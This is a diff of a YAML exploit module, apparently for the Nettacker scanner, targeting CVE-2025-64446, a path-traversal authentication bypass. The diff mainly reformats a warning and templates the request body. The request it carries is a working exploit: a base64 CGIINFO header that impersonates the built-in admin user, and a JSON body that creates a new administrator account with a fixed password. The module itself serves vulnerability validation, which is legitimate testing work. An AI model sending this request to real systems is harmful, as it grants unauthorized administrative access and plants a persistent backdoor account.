@@ -7,12 +7,12 @@ info:
     authentication bypass via relative path traversal, allowing unauthenticated
     attackers to perform administrative actions through crafted API requests.
 
-  WARNING: |
-    This module is intrusive and state-modifying. Successful exploitation
-    attempts to create an administrative user on the target system. Running
-    this module may leave persistent artifacts, trigger security alerts, or
-    modify the target configuration. Use only in authorized environments such
-    as controlled testing, incident response, or vulnerability validation.
+    WARNING:
+      This module is intrusive and state-modifying. Successful exploitation
+      attempts to create an administrative user on the target system. Running
+      this module may leave persistent artifacts, trigger security alerts, or
+      modify the target configuration. Use only in authorized environments such
+      as controlled testing, incident response, or vulnerability validation.
 
   reference:
     - https://nvd.nist.gov/vuln/detail/CVE-2025-64446
@@ -37,10 +37,10 @@ payloads:
           Content-Type: "application/json"
           CGIINFO: "eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=="
         data: |
-            {
-              "data": {
+            {{
+              "data": {{
                   "q_type": 1,
-                  "name": "nettacker_admin",
+                  "name": "nettacker_{scan_id}",
                   "access-profile": "prof_admin",
                   "access-profile_val": "0",
                   "last-name": "",
@@ -74,8 +74,8 @@ payloads:
                   "force-password-change": "disable",
                   "force-password-change_val": "0",
                   "password": "nettacker_pass123"
-              }
-            }
+              }}
+            }}
         allow_redirects: false
         ssl: false
         url:
